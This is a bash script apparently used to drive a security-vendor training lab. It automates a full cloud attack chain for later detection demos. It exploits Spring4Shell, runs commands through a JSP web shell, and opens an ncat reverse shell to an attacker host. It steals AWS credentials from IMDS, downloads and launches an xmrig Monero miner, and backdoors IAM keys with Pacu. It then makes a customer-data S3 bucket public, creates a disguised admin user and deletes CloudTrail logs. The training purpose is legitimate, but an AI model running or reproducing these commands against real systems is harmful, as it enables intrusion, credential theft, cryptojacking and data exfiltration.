#!/bin/bash

shopt -s expand_aliases
alias aws=/usr/local/bin/aws
alias pacu=/home/ubuntu/pacu/cli.py

function cloud_reeval() {
  TASK_COMPLETION="null"

  API_TOKEN=$(cat /opt/sysdig/user_data_SECURE_API_OK)
  PRODUCT_API_ENDPOINT=$(cat /opt/sysdig/SECURE_API_ENDPOINT)

  TASK_ID=$(curl $PRODUCT_API_ENDPOINT/api/cspm/v1/tasks --header "Authorization: Bearer $API_TOKEN" --header 'Content-Type: application/json' --data-raw '{
      "task": {
          "name": "AWS Scan - Instruqt automation",
          "type": 7,
          "parameters": {
              "account": "'$(echo $INSTRUQT_AWS_ACCOUNT_AWSACCOUNT_ACCOUNT_ID)'",
              "providerType": "AWS"
          }
      }
  }' -s | jq -r .taskID)

  echo Task with ID $TASK_ID created for AWS Evaluation.

  while [ $TASK_COMPLETION == "null" ]
  do
  echo "Task still processing. Waiting 5 seconds to re-check."
  sleep 5
  echo "Checking Task ID $TASK_ID"

  TASK_OUTPUT=$(curl $PRODUCT_API_ENDPOINT/api/cspm/v1/tasks/$TASK_ID --header "Authorization: Bearer $API_TOKEN" -s)

  TASK_COMPLETION=$(echo $TASK_OUTPUT | jq .data.endDate -r)
  done

  echo $TASK_OUTPUT | jq .

  echo "$TASK_ID completed procession. Review results."
}

press_any_key() {
    echo
    echo -e "\e[42m+---------------+"
    echo -e "|  Press enter  |"
    echo -e "+---------------+\e[0m"
    read

    # read -n 1 -s -r -p "Press any key to continue"; echo
}

# functions to simulate interactive shell, "fake advanced"
show_message_box() {
  echo ""
  echo ""
  # Assign parameters to variables
  local message_title=$(echo "$1" | tr '[:lower:]' '[:upper:]')  # Title in uppercase
  local message_body="$2"
  
  # Terminal colors and styles
  local red=$(tput setaf 1)
  local reset=$(tput sgr0)
  local bold=$(tput bold)
  
  # Get terminal width
  local term_width=$(tput cols)
  
  # Calculate box width based on the longest string
  local max_length=${#message_title}
  [[ ${#message_body} -gt $max_length ]] && max_length=${#message_body}
  local box_width=$((max_length + 4))  # Add some padding
  
  # Calculate horizontal padding for centering the box
  local hpad=$(( (term_width - box_width) / 2 ))
  
  # Top border
  printf "%${hpad}s" ''  # Horizontal padding before the box
  echo -n "${red}+"
  printf '%0.s-' $(seq 1 $box_width)
  echo "+${reset}"
  
  # Title
  printf "%${hpad}s" ''  # Horizontal padding
  echo -n "${red}| ${bold}"
  printf "%-${max_length}s" "$message_title"
  echo "${reset}${red} |${reset}"
  
  # Title underline with '='
  printf "%${hpad}s" ''  # Horizontal padding
  echo -n "${red}|"
  printf '=%.0s' $(seq 1 $((max_length + 2)))
  echo "|${reset}"
  
  # Body
  printf "%${hpad}s" ''  # Horizontal padding
  echo -n "${red}| ${reset}"
  printf "%-${max_length}s" "$message_body"
  echo "${red} |${reset}"
  
  # Bottom border
  printf "%${hpad}s" ''  # Horizontal padding
  echo -n "${red}+"
  printf '%0.s-' $(seq 1 $box_width)
  echo "+${reset}"
  
}

simulate_command() {
    command=$1
    wait=$2
    wait2=$3
    timeCommand=$4

    # Simulate command typing
    echo ""
    echo -n -e "\e]0;\u@\h: \w\a\e[01;32mroot@attacker\e[00m:~\e[01;34m\e[00m#"

    for ((i = 0; i < 3; ++i)); do
        printf " "  # Add space as "cursor"
        sleep 0.5
        printf "\b" # Go back to delete "cursor"
    done
    echo -n " "
    interval=$(echo "scale=2; $timeCommand /${#command}" | bc)
    for (( i=0; i<${#command}; i++ )); do
        echo -n "${command:$i:1}"
        sleep $interval
    done
    echo -n
    echo -n " "

    # Wait a bit and then execute command
    sleep $wait
    echo
    eval $command
    sleep $wait2
}

simulate_command_fake() {
    command=$1
    wait=$2
    wait2=$3
    timeCommand=$4

    # Simulate command typing
    echo ""
    echo -n -e "\e]0;\u@\h: \w\a\e[01;32mroot@attacker\e[00m:~\e[01;34m\e[00m#"

    for ((i = 0; i < 3; ++i)); do
        printf " "  # Add space as "cursor"
        sleep 1
        printf "\b" # Go back to delete "cursor"
    done
    echo -n " "
    interval=$(echo "scale=2; $timeCommand /${#command}" | bc)
    for (( i=0; i<${#command}; i++ )); do
        echo -n "${command:$i:1}"
        sleep $interval
    done
    echo -n

    for ((i = 0; i < 3; ++i)); do
        printf " "  # Add space as "cursor"
        sleep 1
        printf "\b" # Go back to delete "cursor"
    done
    echo -n " "

    # Wait a bit and then execute command
    sleep $wait
    echo
    sleep $wait2
}

start_time=$(date +%s)


timeout 5s termdown 600 -a -f roman

clear

cat << EOF

==============================================================
- Overview of the attack
==============================================================

This script automates the attack. Steps we will go over:
- Reconnaissance: learn about the tools that attackers use to find and target vulnerable devices.
- Resource Development: investigate the vulnerability and prepare an exploit script.
- Initial Access: use a rootkit to exploit a public facing application with the Spring4shell vulnerability.
- Discovery: explore the compromised system for weaknesses and extract cloud credentials.
- Impact: exploit resources to mine Monero in the victim's infrastructure.
- Privilege Escalation: exploit the IAM role attached to the EC2 instance to access the cloud account.
- Defense Evasion: try to disable AWS CloudTrail.
- Discovery: target Cloud Infrastructure to explore resources in the account and expand your reach using Pacu.
- Misconfigured IAM roles: use your current permissions to get administrator rights.
- Collection: Stealing customer data from cloud storage (S3 buckets).
- Persistence: Create account for later use.
- Defense Evasion: hide your actions from account administrators.

EOF

press_any_key
clear

cat << EOF

==============================================================
- Reconnaissance: Active Scanning IP Blocks
==============================================================

We found a potentially vulnerable address that belongs to Cyberdyne System, lets check if we have any ports open?

To do so we will run the command: nmap

EOF

simulate_command "nmap -p- $VULN_APP_ADD_IP" 1 0 1
show_message_box "SEVERAL PORTS ARE EXPOSED!" "Notes: infra running in AWS, and some webserver publicly exposed. For example: $VULN_APP_ADD_PORT_2"

press_any_key
clear

cat << EOF

==============================================================
- Reconnaissance: Gather Victim Host Information
==============================================================

Let's browse into it and intentionally try to open a non-existing path in the webserver:

EOF

simulate_command "curl $VULN_APP_ADD_2/wrong-page.html -H 'Accept: text/html'" 1 1 1
show_message_box "WEBSERVER STACK IDENTIFIED" "Notes: We can see the application's error message: is it using Springboot?"

cat << EOF

After some research, we learned that there is 0Day vulnerability called Spring4Shell and there is an easy way to check if application might be affected by running following command.
If its output returns error 400, it means endpoint is exploitable. Lets give it a try...

EOF

simulate_command "curl -I $VULN_APP_ADD_2/?class.module.classLoader.URLs%5B0%5D=0" 1 1 1

cat << EOF

...
It was indeed returning status code 400! 
Now lets try to exploit it...

EOF

press_any_key
clear

cat << EOF

==============================================================
- Initial access: Exploit Public Facing Application
==============================================================

To achieve that we have downloaded the rootkit to the attacker host.
Let's execute the python exploit.

EOF

simulate_command "cd /home/ubuntu/SpringCore0day" 1 0 1
simulate_command "python3 ./exp.py --url $VULN_APP_ADD_2" 1 1 1
show_message_box "VULNERABILITY EXPLOITED!" "Exploit developers suggest to execute whoami to check if script worked."

cat << EOF

...
So, let's do it! But let's also execute some other commands to look around the compromised system:

EOF

simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=uname -a" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=uname -a" -s | grep -a -v request.getParameter | sed '\~^//~d'
simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=whoami" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=whoami" -s | grep -a -v request.getParameter | sed '\~^//~d'

show_message_box "ROOT ACCESS" "We'll run a reverse shell into the workload to get an interactive terminal session."

press_any_key
clear

curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" | grep -a -v request.getParameter | sed '\~^//~d'
curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=chmod +x ncat" | grep -a -v request.getParameter | sed '\~^//~d'

cat << EOF

==============================================================
- Initial access: Exploit Public Facing Application
==============================================================

Downloading ncat in the background in the compromised machine...
Now we can launch and connect to the reverse shell:

EOF

simulate_command_fake "nohup sh -c 'sleep 15 && curl --output - \"$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j\" -s --data-urlencode \"cmd=./ncat $EC2_ATTACKER_INSTANCE_ADD 34444 -e /bin/bash\" &> /dev/null &" 1 1 1
nohup sh -c "sleep 12 && curl --output - \"$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j\" -s --data-urlencode \"cmd=./ncat $EC2_ATTACKER_INSTANCE_ADD 34444 -e /bin/bash\" | grep -a -v request.getParameter | sed '\~^//~d'" 2>/dev/null &
simulate_command_fake 'echo "ps -aux && exit" | nc -lnvp 34444' 1 1 1
echo "ps -aux && exit" | nc -lnvp 34444

sleep 1

cat << EOF

After running ps -aux, we conclude this is an isolated workload inside of a container,
(because java is the process with pid=1).

Let's discover some more details about this workload and the infra where it runs...

EOF

press_any_key
clear

cat << EOF

==============================================================
- Discovery: System Information Discovery
==============================================================
EOF

simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=id" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=id" -s | grep -a -v request.getParameter | sed '\~^//~d'
simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=cat /etc/passwd" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=cat /etc/passwd" -s | grep -a -v request.getParameter | sed '\~^//~d'
simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=find / -name id_rsa" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=find / -name id_rsa" -s | grep -a -v request.getParameter | sed '\~^//~d'

show_message_box "SENSITIVE FILES IN RISK" "Linux password files, sensitive files, customer information..."

sleep 2

press_any_key

clear

cat << EOF

==============================================================
- Discovery: System Information Discovery
==============================================================

We can confirm if the workload is runnning in AWS by executing the next command, by quering the IMDS endpoint.

EOF

simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=curl --connect-timeout 0.2 http://169.254.169.254/latest/dynamic/instance-identity/"' 1 1 1
curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=curl --connect-timeout 0.2 http://169.254.169.254/latest/dynamic/instance-identity/" | grep -a -v request.getParameter | sed '\~^//~d'

cat << EOF

Yep! It worked. Not only runs in AWS, but we can also see that version 1 of IMDS is enabled.

Let's see if we have any AWS credentials insecurely attached to use them later during the attack.

EOF

press_any_key
clear

cat << EOF

==============================================================
- Credential Access: Steal Application Access Token
==============================================================

Let's run the next command.
And, in case we find any, we'll store them in /home/ubuntu/resources/aws_creds.json

EOF

### TODO: Check command exit status
ROLE=$(curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" -s | grep -a -v request.getParameter | sort | uniq | sed '/^\/\//d' | tr -d '\000')
mkdir -p /home/ubuntu/resources && touch /home/ubuntu/resources/aws_creds.json
simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" -s | jq -c | sort | uniq | grep -a -v "^0" > /home/ubuntu/resources/aws_creds.json' 1 1 1
curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" -s | grep -a -v request.getParameter | grep -a -v "^//" | jq -c | sort | uniq | grep -a -v "^0" > /home/ubuntu/resources/aws_creds.json
simulate_command 'cat /home/ubuntu/resources/aws_creds.json | jq' 1 1 1

show_message_box "LATERAL MOVEMENT COMPLETED!" "We just got credentials to extend the attack from a k8s workload into the cloud account."

press_any_key
clear

cat << EOF

==============================================================
- Impact: Resource Hijacking
==============================================================

Now, lets run a cryptominer:

EOF

sleep 3

simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=wget -O file.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=wget -O file.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz" -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
simulate_command_fake 'curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=tar -xf file.tar.gz" -s' 1 1 1
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=tar -xf file.tar.gz" -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=wget -O /crypto_run.sh https://raw.githubusercontent.com/draios/instruqt-assets/main/secure/cnapp-scarleteel-v2/crypto_run.sh" -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode 'cmd=chmod u+x /crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'

simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=setsid /xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background"' 1 1 1
screen -d -m bash -c "curl --output - $VULN_APP_ADD_2/tomcatwar.jsp?pwd=j --data-urlencode 'cmd=/crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq"
simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps -ef"' 1 1 1
curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps -ef" | grep -a -v request.getParameter

show_message_box "RESOURCE HIJACKING COMPLETED!" "We just successfully deployed cryptominer on target workload."

press_any_key
clear

cat << 'EOF'

==============================================================
- Privilege Escalation: Exploitation for Privilege Escalation
==============================================================

Now lets check what we can do with discovered AWS account credentials.
We'll configure our terminal to use the stolen credentials first.

EOF

eval "$(cat /home/ubuntu/resources/aws_creds.json | jq -r '. | "export AWS_ACCESS_KEY_ID=\(.AccessKeyId | @sh) AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey | @sh) AWS_SESSION_TOKEN=\(.Token | @sh)"')"
export AWS_REGION=us-east-1

simulate_command "aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID && aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY && aws configure set aws_session_token $AWS_SESSION_TOKEN && aws configure set default.region $AWS_REGION && aws configure set region $AWS_REGION" 1 1 1

cat << 'EOF'

Let's verify that we have valid credentials:
EOF

simulate_command 'echo $(aws sts get-caller-identity) | jq' 1 1 1

show_message_box "LATERAL MOVEMENT" "We have just accessed the cloud account from a Kubernetes workload."

press_any_key
clear

cat << EOF

==============================================================
- Defense evasion: disable AWS CloudTrail
==============================================================

Let's list cloudtrails and try to disable them:

EOF

simulate_command 'aws cloudtrail list-trails --no-paginate --region us-east-1' 1 1 1

show_message_box "NOT ENOUGH PERMISSIONS" "The role is not privileged to disable logging."

press_any_key
clear

cat << EOF

==============================================================
- Discovery: Cloud Infrastructure
==============================================================

Lets check if we can get access to some of other resources?

EOF

simulate_command 'aws kms list-keys' 1 1 1
simulate_command 'aws s3api list-buckets --query "Buckets[].Name"' 1 1 1
simulate_command 'aws iam list-users | jq' 1 1 1
simulate_command 'aws iam list-policies --only-attached | jq' 1 1 1

cloud_reeval &>/dev/null & disown

show_message_box "LEAST PRIVILEGE NOT ENFORCED" "Attackers were able to retrieve critical information about Identities in the cloud account."

press_any_key
clear

cat << EOF

==============================================================
- Discovery: Cloud Infrastructure Discovery (automated exploit)
==============================================================

As we can see, some actions are allowed and some not. We can use automated tool like Pacu (a Metaexploit for AWS) to explore resources. We will run following commands.

EOF

simulate_command 'pacu --new-session scarleteel --import-keys default --set-regions us-east-1' 1 1 1
simulate_command 'pacu --session scarleteel --module-name ec2__enum --exec' 1 1 1
simulate_command 'pacu --session scarleteel --module-name iam__enum_users_roles_policies_groups --exec' 1 1 1
clear
simulate_command_fake 'pacu --session scarleteel --module-name iam__backdoor_users_keys --module-args ... --exec' 1 1 1
OUTPUT=$(pacu --session scarleteel --module-name iam__backdoor_users_keys --module-args '--usernames admin0,admin1,admin2,admin3,Admin6' --exec)
echo "${OUTPUT}"

sleep 1

show_message_box "CLOUD PRIVILEGE ESCALATION" "Using the cloud exploit, we can elevate to admin permissions!"

cat << 'EOF'

Via a misconfigured IAM role, we were able to discover Admin account and escalate privileges in the account from a temporary role to an user with administrator access.

Load those credentials to find out what else we can achieve now.

EOF

rm -rf ~/.aws/ && reset
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_DEFAULT_REGION

ACCESS_KEY=$(echo "$OUTPUT" | grep "Access Key ID" | awk '{print $NF}')
SECRET_KEY=$(echo "$OUTPUT" | grep "Secret Key" | awk '{print $NF}')
simulate_command 'aws configure set aws_access_key_id "$ACCESS_KEY" && aws configure set aws_secret_access_key "$SECRET_KEY" && aws configure set region "us-east-1" && aws configure set output "json"' 1 1 1
echo $(aws sts get-caller-identity) | jq

show_message_box "NOW WE ARE ADMIN" "Let's see what else we can do."

press_any_key
clear

cat << EOF

==============================================================
- Collection: Stealing data from cloud storage (S3 buckets)
==============================================================

Check which S3 buckets are available
EOF

simulate_command 'aws s3api list-buckets' 1 1 1

show_message_box "CLOUD DATA STORAGE" "We found a bucket with apparently sensitive information."

cat << EOF

Mmm... customer data? Let's find out more about it's content.
EOF

BUCKET_NAME=$(aws s3api list-buckets | jq -r .Buckets[].Name | grep customer)
simulate_command "aws s3api list-objects --bucket $BUCKET_NAME --query 'Contents[].{Key: Key, Size: Size}'" 1 1 1

cat << EOF

There's something here, try to access it:
EOF
simulate_command "curl https://$BUCKET_NAME.s3.us-east-1.amazonaws.com/pii/users.csv" 1 1 1

cat << EOF

Access denied. Try to setup a loose policy to access the object easily from anywhere:
EOF

simulate_command "aws s3api delete-public-access-block --bucket $BUCKET_NAME" 1 1 1
cat << EOF > /home/ubuntu/public-access-policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "allow-access",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": [
                "arn:aws:s3:::$BUCKET_NAME/*"
            ]
        }
    ]
}
EOF

simulate_command "aws s3api put-bucket-policy --bucket $BUCKET_NAME --policy file:///home/ubuntu/public-access-policy.json --region us-east-1" 1 1 1
simulate_command "curl https://$BUCKET_NAME.s3.us-east-1.amazonaws.com/pii/users.csv; echo" 1 1 1

cat << EOF

Sensitive customer data has been leaked.
EOF

show_message_box "SENSITIVE CUSTOMER INFORMATION" "We successfully obtained valuable customer data stored on S3 bucket."

press_any_key
clear

cat << EOF

==============================================================
- Persistence: Create admin account for later use 
==============================================================

EOF

simulate_command "aws iam create-user --user-name non-suspicious-user" 1 1 1
simulate_command "aws iam create-access-key --user-name non-suspicious-user" 1 1 1
simulate_command "aws iam attach-user-policy --user-name non-suspicious-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" 1 1 1

cat << EOF

Verify that user has attached policy:
EOF

simulate_command "aws iam list-attached-user-policies --user-name non-suspicious-user" 1 1 1

show_message_box "ADDITIONAL CREDENTIALS" "We have created additional privileged credentials for future use."

press_any_key
clear

cat << EOF

==============================================================
- Defense evasion: disable AWS CloudTrail
==============================================================

Let's use our new elevated permissions!
For example, we can try to list cloudtrails once more:
EOF

simulate_command 'aws cloudtrail list-trails --no-paginate --region us-east-1' 1 1 1

cat << EOF

We can list all the available trails in the region.
Can we disable them? This way our actions will be unnoticed!
EOF

simulate_command 'aws cloudtrail stop-logging --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
simulate_command 'aws cloudtrail delete-trail --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1

show_message_box "DEFENSIVE EVASION" "CloudTrail logs have been disable successfully."

press_any_key
clear

cat << EOF

==============================================================
- Summary
==============================================================

During this stage, we:
- Found and accessed a vulnerable host.
- Gathered information about the system
- Accessed unsecured AWS credentials via IMDSv1.
- Mined some *Monero* in the victim's host.
- Exploited the temporary credentials associated with IMDSv1 to an EC2 instance
- Discovered cloud infrastructure
- Escalated to administrator privileges via a IAM misconfiguration
- Collected customer data from cloud storage (S3 buckets)
- Created account for later use
- Evaded Cloud Defense by disabling logs.

EOF

end_time=$(date +%s)
duration=$((end_time - start_time))
minutes=$((duration / 60))
seconds=$((duration % 60))
echo "Time taken: $minutes minutes and $seconds seconds."

timeout 5s termdown 5 -a -f roman -T GAMEOVER

clear

cat << EOF

In the next step we'll find out how Sysdig Secure can help with detection of the attack sequence performed during this section of the lab.
EOF